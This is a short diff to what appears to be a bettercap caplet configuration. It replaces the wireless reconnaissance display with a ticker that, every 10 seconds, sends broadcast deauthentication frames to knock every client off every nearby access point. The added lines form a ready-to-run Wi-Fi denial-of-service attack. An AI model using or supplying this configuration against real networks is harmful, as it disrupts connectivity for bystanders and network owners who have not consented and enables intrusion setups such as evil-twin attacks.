@@ -1,8 +1,8 @@
-# let's add some api :D
-include rest-api.cap
-
 set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
-set ticker.commands clear; wifi.show; net.show; events.show 20
+
+# every 10 seconds deauth every client from every ap
+set ticker.period 10
+set ticker.commands clear; wifi.deauth ff:ff:ff:ff:ff:ff
 
 # uncomment to only hop on these channels:
 # wifi.recon.channel 1,2,3
@@ -11,4 +11,3 @@ wifi.recon on
 ticker on
 events.clear
 clear
-
